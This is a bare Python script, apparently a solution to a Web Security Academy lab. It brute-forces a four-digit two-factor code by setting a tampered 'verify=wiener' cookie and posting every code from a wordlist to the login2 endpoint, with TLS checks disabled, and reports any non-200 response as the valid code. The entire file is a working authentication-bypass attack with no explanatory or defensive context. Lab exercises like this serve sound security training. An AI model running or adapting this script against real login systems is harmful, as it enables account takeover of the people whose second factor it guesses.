import requests
import urllib3

urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

proxies = {'http': 'http://127.0.0.1:3333', 'https': 'http://127.0.0.1:3333'}

headers = {
  "Cookie": "verify=wiener",
  'Content-Type': 'application/x-www-form-urlencoded',
  'Origin': 'https://0ab0006f035d6f0280a91211006f00d1.web-security-academy.net',
  'Referer': 'https://0ab0006f035d6f0280a91211006f00d1.web-security-academy.net/login2'
}

with open("four_digits_mfa.txt", "r") as file:
    while True:
        mfa_code = file.readline()
        if not mfa_code:  # End of file reached
            break
        data = f"mfa-code={mfa_code}"

        r = requests.post(
            "https://0ab0006f035d6f0280a91211006f00d1.web-security-academy.net/login2",
            # "http://127.0.0.1:3333",
            data=data,
            headers=headers,
            allow_redirects=False,
            verify=False,
            # proxies=proxies
        )
        if r.status_code != 200:
            print('(+) !!!!!! ' + mfa_code)

